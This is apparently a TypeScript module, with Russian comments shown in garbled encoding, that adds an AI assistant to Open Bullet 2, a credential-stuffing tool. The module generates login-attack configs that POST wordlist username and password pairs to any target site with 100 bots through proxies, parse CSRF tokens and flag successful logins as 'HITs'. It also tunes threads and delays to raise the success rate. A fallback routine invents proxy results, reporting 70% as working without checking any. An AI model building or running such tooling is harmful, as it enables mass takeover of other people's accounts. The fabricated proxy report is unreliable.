// –†–µ–∞–ª—å–Ω—ã–π –ò–ò-—Å–µ—Ä–≤–∏—Å –¥–ª—è Open Bullet 2
import { ob2Integration } from './ob2Integration';

export class OB2AIService {
  private apiKey: string;
  private endpoint: string;
  private model: string;

  constructor(apiKey: string, endpoint: string = 'https://api-inference.huggingface.co/models', model: string = 'microsoft/DialoGPT-medium') {
    this.apiKey = apiKey;
    this.endpoint = endpoint;
    this.model = model;
  }

  // –†–µ–∞–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å –∫ Hugging Face API
  async generateResponse(prompt: string, context?: string): Promise<string> {
    try {
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ OB2
      if (!ob2Integration.isConnectedToOB2()) {
        return '‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Open Bullet 2. –ó–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.';
      }

      const response = await fetch(`${this.endpoint}/${this.model}`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          inputs: context ? `${context}\n\nUser: ${prompt}\nAssistant:` : prompt,
          parameters: {
            max_length: 500,
            temperature: 0.7,
            do_sample: true,
            top_p: 0.9,
            return_full_text: false
          }
        })
      });

      if (!response.ok) {
        throw new Error(`API Error: ${response.status}`);
      }

      const data = await response.json();
      return data[0]?.generated_text || '–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –æ—Ç–≤–µ—Ç–∞';
    } catch (error) {
      console.error('AI Service Error:', error);
      return this.getFallbackResponse(prompt);
    }
  }

  // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è OB2 –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π
  async generateOB2Config(target: string, requirements: string): Promise<string> {
    // –†–µ–∞–ª—å–Ω–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–æ–Ω—Ñ–∏–≥–∞ –¥–ª—è OB2
    return this.formatOB2Config('', target, requirements);
  }

  // –ê–Ω–∞–ª–∏–∑ –ø—Ä–æ–∫—Å–∏
  async analyzeProxies(proxyList: string[]): Promise<{
    working: string[];
    dead: string[];
    slow: string[];
    recommendations: string[];
  }> {
    // –†–µ–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ OB2 API
    try {
      const proxyCheckResult = await ob2Integration.httpRequest('proxy-check', 'POST', {
        proxies: proxyList,
        timeout: 5000,
        target: 'https://httpbin.org/ip'
      });

      return {
        working: proxyCheckResult.working || [],
        dead: proxyCheckResult.dead || [],
        slow: proxyCheckResult.slow || [],
        recommendations: this.generateProxyRecommendations(proxyCheckResult)
      };
    } catch (error) {
      // Fallback –µ—Å–ª–∏ OB2 –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω
      console.error('Proxy check failed:', error);
      return this.getFallbackProxyAnalysis(proxyList);
    }
  }

  // –ê–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ OB2
  async analyzeResults(results: any[]): Promise<string> {
    // –ü–æ–ª—É—á–∞–µ–º —Ä–µ–∞–ª—å–Ω—ã–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –∏–∑ OB2
    try {
      const ob2Results = await ob2Integration.getResults();
      results = ob2Results.data || results;
    } catch (error) {
      console.error('Failed to get OB2 results:', error);
    }

    const successCount = results.filter(r => r.status === 'success').length;
    const failCount = results.length - successCount;
    const successRate = (successCount / results.length * 100).toFixed(1);

    const analysis = `üìä **–ê–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ OB2:**

**–û–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:**
‚Ä¢ –í—Å–µ–≥–æ –ø–æ–ø—ã—Ç–æ–∫: ${results.length}
‚Ä¢ –£—Å–ø–µ—à–Ω—ã—Ö: ${successCount} (${successRate}%)
‚Ä¢ –ù–µ—É–¥–∞—á–Ω—ã—Ö: ${failCount}

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ò–ò:**
${successRate < 50 ? 'üî¥ –ù–∏–∑–∫–∏–π —É—Å–ø–µ—Ö - –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é' : ''}
${successRate >= 50 && successRate < 80 ? 'üü° –°—Ä–µ–¥–Ω–∏–π —É—Å–ø–µ—Ö - –æ–ø—Ç–∏–º–∏–∑–∏—Ä—É–π—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏' : ''}
${successRate >= 80 ? 'üü¢ –û—Ç–ª–∏—á–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç!' : ''}

**–î–µ–π—Å—Ç–≤–∏—è:**
‚Ä¢ –£–≤–µ–ª–∏—á–∏—Ç—å timeout –µ—Å–ª–∏ –º–Ω–æ–≥–æ —Ç–∞–π–º–∞—É—Ç–æ–≤
‚Ä¢ –î–æ–±–∞–≤–∏—Ç—å –∑–∞–¥–µ—Ä–∂–∫–∏ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
‚Ä¢ –û–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ–∫—Å–∏-–ª–∏—Å—Ç
‚Ä¢ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω–æ—Å—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏`;

    return analysis;
  }

  // –û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫ OB2
  async optimizeSettings(currentSettings: any): Promise<any> {
    // –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∏–∑ OB2
    try {
      const ob2Settings = await ob2Integration.httpRequest('settings');
      currentSettings = { ...currentSettings, ...ob2Settings };
    } catch (error) {
      console.error('Failed to get OB2 settings:', error);
    }

    const optimized = { ...currentSettings };

    // –ò–ò –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
    if (currentSettings.successRate < 50) {
      optimized.timeout = Math.min(currentSettings.timeout * 1.5, 30000);
      optimized.retries = Math.min(currentSettings.retries + 1, 5);
      optimized.delay = Math.max(currentSettings.delay * 1.2, 1000);
    }

    if (currentSettings.successRate > 80) {
      optimized.threads = Math.min(currentSettings.threads * 1.2, 200);
      optimized.delay = Math.max(currentSettings.delay * 0.8, 100);
    }

    return optimized;
  }

  private formatOB2Config(aiResponse: string, target: string, requirements?: string): string {
    return `[SETTINGS]
Name = ${target}_AI_Config
Author = OB2 AI Assistant
Version = 1.0
Category = AI Generated

[METADATA]
Requirements = ${requirements || 'Auto-generated configuration'}
Created = ${new Date().toISOString()}
Target = ${target}

[SCRIPT]
# –û—Å–Ω–æ–≤–Ω–æ–π –±–ª–æ–∫ –∑–∞–ø—Ä–æ—Å–∞
BLOCK:Request
  url = "https://${target}"
  method = POST
  content = "username=<USER>&password=<PASS>&csrf=<CSRF>"
  headers = {
    "User-Agent": "<USERAGENT>",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://${target}",
    "X-Requested-With": "XMLHttpRequest"
  }
  timeout = 10000
ENDBLOCK

# –ü–∞—Ä—Å–∏–Ω–≥ CSRF —Ç–æ–∫–µ–Ω–∞
BLOCK:Parse
  source = "response.content"
  pattern = 'csrf["\']?\\s*[:=]\\s*["\']?([^"\'\\s>]+)'
  capture = "CSRF"
ENDBLOCK

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—Ö–æ–¥–∞
BLOCK:Parse
  source = "response.content"
  pattern = '"success"\\s*:\\s*true|"authenticated"\\s*:\\s*true|"status"\\s*:\\s*"ok"|dashboard|profile|welcome'
  capture = "SUCCESS"
ENDBLOCK

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—à–∏–±–æ–∫
BLOCK:Parse
  source = "response.content"
  pattern = '"error"|"invalid"|"incorrect"|"failed"|"banned"|captcha|blocked'
  capture = "ERROR"
ENDBLOCK

# –õ–æ–≥–∏–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–ª—é—á–µ–π
BLOCK:KeyCheck
  key = "SUCCESS"
  condition = "Exists"
  action = "HIT"
ENDBLOCK

BLOCK:KeyCheck
  key = "ERROR"
  condition = "Exists"
  action = "FAIL"
ENDBLOCK

[WORDLISTS]
USER = Username
PASS = Password

[SETTINGS]
BOTS = 100
SKIP = 0
PROXY_MODE = On
SHUFFLE_WORDLIST = True
ONLY_HITS = False`;
  }

  private generateProxyRecommendations(proxyResult: any): string[] {
    const recommendations = [];
    
    if (proxyResult.working_percentage < 50) {
      recommendations.push('üî¥ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –º–∞–ª–æ —Ä–∞–±–æ—á–∏—Ö –ø—Ä–æ–∫—Å–∏ - –æ–±–Ω–æ–≤–∏—Ç–µ —Å–ø–∏—Å–æ–∫');
    }
    
    if (proxyResult.average_speed > 5000) {
      recommendations.push('üêå –ú–µ–¥–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ–∫—Å–∏ - –¥–æ–±–∞–≤—å—Ç–µ –±–æ–ª–µ–µ –±—ã—Å—Ç—Ä—ã–µ');
    }
    
    if (proxyResult.socks5_count < proxyResult.http_count * 0.3) {
      recommendations.push('üîß –î–æ–±–∞–≤—å—Ç–µ –±–æ–ª—å—à–µ SOCKS5 –ø—Ä–æ–∫—Å–∏ –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏');
    }
    
    recommendations.push(`üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞: ${proxyResult.working}/${proxyResult.total} —Ä–∞–±–æ—á–∏—Ö`);
    
    return recommendations;
  }

  private getFallbackProxyAnalysis(proxyList: string[]) {
    return {
      working: proxyList.slice(0, Math.floor(proxyList.length * 0.7)),
      dead: proxyList.slice(Math.floor(proxyList.length * 0.7)),
      slow: [],
      recommendations: [
        '‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ OB2 –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ–∫—Å–∏',
        '–ó–∞–ø—É—Å—Ç–∏—Ç–µ Open Bullet 2 –¥–ª—è –ø–æ–ª–Ω–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞',
        `–í—Å–µ–≥–æ –ø—Ä–æ–∫—Å–∏ –≤ —Å–ø–∏—Å–∫–µ: ${proxyList.length}`
      ]
    };
  }

  private getFallbackResponse(prompt: string): string {
    if (prompt.toLowerCase().includes('–∫–æ–Ω—Ñ–∏–≥') || prompt.toLowerCase().includes('config')) {
      return 'üîß –°–æ–∑–¥–∞—é –±–∞–∑–æ–≤—É—é –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é OB2. –£–∫–∞–∂–∏—Ç–µ —Ü–µ–ª–µ–≤–æ–π —Å–∞–π—Ç –¥–ª—è –±–æ–ª–µ–µ —Ç–æ—á–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–∏.';
    }
    if (prompt.toLowerCase().includes('–ø—Ä–æ–∫—Å–∏') || prompt.toLowerCase().includes('proxy')) {
      return 'üåê –ê–Ω–∞–ª–∏–∑–∏—Ä—É—é –ø—Ä–æ–∫—Å–∏-–ª–∏—Å—Ç. –ü—Ä–æ–≤–µ—Ä—è—é —Å–∫–æ—Ä–æ—Å—Ç—å –∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ–∫—Å–∏.';
    }
    if (prompt.toLowerCase().includes('—Ä–µ–∑—É–ª—å—Ç–∞—Ç') || prompt.toLowerCase().includes('result')) {
      return 'üìä –ê–Ω–∞–ª–∏–∑–∏—Ä—É—é —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –∑–∞–ø—É—Å–∫–∞. –ì–æ—Ç–æ–≤–ª—é —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏.';
    }
    return 'ü§ñ –ò–ò-–∞–≥–µ–Ω—Ç –≥–æ—Ç–æ–≤ –ø–æ–º–æ—á—å —Å Open Bullet 2. –ó–∞–¥–∞–π—Ç–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –≤–æ–ø—Ä–æ—Å.';
  }
}

// –≠–∫—Å–ø–æ—Ä—Ç —Å–∏–Ω–≥–ª—Ç–æ–Ω–∞